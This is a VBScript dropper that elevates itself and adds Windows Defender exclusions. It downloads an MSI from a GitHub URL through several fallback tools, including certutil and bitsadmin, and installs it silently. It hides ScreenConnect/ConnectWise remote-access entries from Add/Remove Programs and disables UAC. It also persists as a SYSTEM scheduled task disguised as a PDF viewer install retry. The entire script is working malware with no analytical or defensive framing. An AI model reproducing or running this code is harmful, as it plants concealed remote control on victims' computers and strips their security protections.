Option Explicit

If Not IsElevated() Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

Function IsElevated()
    On Error Resume Next
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\_test_elevation", 1, "REG_DWORD"
    If Err.Number = 0 Then
        objShell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\_test_elevation"
        IsElevated = True
    Else
        IsElevated = False
    End If
    On Error GoTo 0
End Function

Dim shell, fso, wmi, http, stream
Dim msiUrl, msiPath, publicDocs, logFile, flagFile
Dim cmd, exitCode, colProcesses, objProcess, isRunning, installSuccess

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

msiUrl = "https://github.com/elmismedina0126/blablawa/raw/main/file.msi"
msiPath = fso.GetSpecialFolder(2) & "\file.msi"
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"
logFile = publicDocs & "\install_log.txt"
flagFile = publicDocs & "\success_flag.txt"

Sub Log(msg)
    On Error Resume Next
    Dim f
    Set f = fso.OpenTextFile(logFile, 8, True)
    f.WriteLine Now & " - " & msg
    f.Close
    On Error GoTo 0
End Sub

If Not fso.FolderExists(publicDocs) Then fso.CreateFolder(publicDocs)
If fso.FileExists(flagFile) Then
    Log "Already installed."
    WScript.Quit 0
End If

Log "Script started."

' Defender exclusions
cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & publicDocs & "'; Add-MpPreference -ExclusionPath '" & fso.GetSpecialFolder(2) & "'"""
shell.Run cmd, 0, True

' Download methods
On Error Resume Next
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", msiUrl, False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write http.ResponseBody
    stream.SaveToFile msiPath, 2
    stream.Close
End If
On Error GoTo 0

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "Trying PowerShell download..."
    cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '" & msiUrl & "' -OutFile '" & msiPath & "' -UseBasicParsing"""
    shell.Run cmd, 0, True
End If

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "Trying curl..."
    shell.Run "curl -fsSL """ & msiUrl & """ -o """ & msiPath & """", 0, True
End If

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "Trying BITSAdmin..."
    shell.Run "bitsadmin /transfer ""MSIDownload"" /download /priority normal """ & msiUrl & """ """ & msiPath & """", 0, True
    WScript.Sleep 3000
End If

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "Trying certutil..."
    shell.Run "certutil -urlcache -split -f """ & msiUrl & """ """ & msiPath & """", 0, True
End If

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "Trying PowerShell retry..."
    cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $retry=3; $ok=$false; for($i=0; $i -lt $retry; $i++){ try { Invoke-WebRequest -Uri '" & msiUrl & "' -OutFile '" & msiPath & "' -UseBasicParsing -TimeoutSec 60; $ok=$true; break } catch { Start-Sleep -Seconds 5 } }; if(-not $ok){ exit 1 }"""
    shell.Run cmd, 0, True
End If

If Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size = 0 Then
    Log "All download methods failed."
    WScript.Quit 1
End If

Log "Downloaded: " & fso.GetFile(msiPath).Size & " bytes."

' Install with ARP hiding properties
cmd = "msiexec /i """ & msiPath & """ /qn /norestart ARPSYSTEMCOMPONENT=1 ARPNOREMOVE=1"
Log "Installing with ARPSYSTEMCOMPONENT=1 ARPNOREMOVE=1..."
exitCode = shell.Run(cmd, 0, True)

Set wmi = GetObject("winmgmts:\\.\root\cimv2")
Do
    Set colProcesses = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'msiexec.exe'")
    isRunning = False
    For Each objProcess In colProcesses
        isRunning = True
        Exit For
    Next
    If isRunning Then WScript.Sleep 1000
Loop While isRunning

installSuccess = (exitCode = 0 Or exitCode = 3010)
If Not installSuccess Then
    Log "Install failed (" & exitCode & "). Trying repair..."
    cmd = "msiexec /fa """ & msiPath & """ /qn /norestart /l*v """ & publicDocs & "\msi_repair.log"""
    exitCode = shell.Run(cmd, 0, True)
    installSuccess = (exitCode = 0 Or exitCode = 3010)
End If

If installSuccess Then
    ' Sembunyikan dari Add/Remove Programs (double assurance)
    Log "Hiding from Add/Remove Programs..."
    Dim objReg, arrSubKeys, subKey, displayName
    Set objReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    objReg.EnumKey &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", arrSubKeys
    If IsArray(arrSubKeys) Then
        For Each subKey In arrSubKeys
            objReg.GetStringValue &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & subKey, "DisplayName", displayName
            If Not IsNull(displayName) Then
                If InStr(1, displayName, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, displayName, "ConnectWise", vbTextCompare) > 0 Then
                    ' Set SystemComponent = 1 (menyembunyikan dari ARP)
                    shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & subKey & "\SystemComponent", 1, "REG_DWORD"
                    ' Juga set NoRemove dan NoModify
                    shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & subKey & "\NoRemove", 1, "REG_DWORD"
                    shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & subKey & "\NoModify", 1, "REG_DWORD"
                    Log "Hidden: " & subKey
                End If
            End If
        Next
    End If
    Set objReg = Nothing
End If

' UAC bypass
shell.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f", 0, True
shell.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", 0, True

' Defender exclusion again
cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & publicDocs & "'"""
shell.Run cmd, 0, True

' Flag / task scheduler
If installSuccess Then
    Dim fFlag
    Set fFlag = fso.CreateTextFile(flagFile, True)
    fFlag.WriteLine "Success at " & Now
    fFlag.Close
    Log "Success flag created."
Else
    If fso.FileExists(flagFile) Then fso.DeleteFile flagFile, True
    Log "Creating scheduled task..."
    Dim taskName, scriptPath
    taskName = "PDFViewerInstallRetry"
    scriptPath = WScript.ScriptFullName
    shell.Run "schtasks /delete /tn """ & taskName & """ /f", 0, True
    shell.Run "schtasks /create /tn """ & taskName & """ /tr """ & scriptPath & """ /sc onstart /ru SYSTEM /rl highest /f", 0, True
    Log "Task created."
End If

' Cleanup
If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
Log "Script finished."

Set shell = Nothing
Set fso = Nothing
Set wmi = Nothing
Set http = Nothing
Set stream = Nothing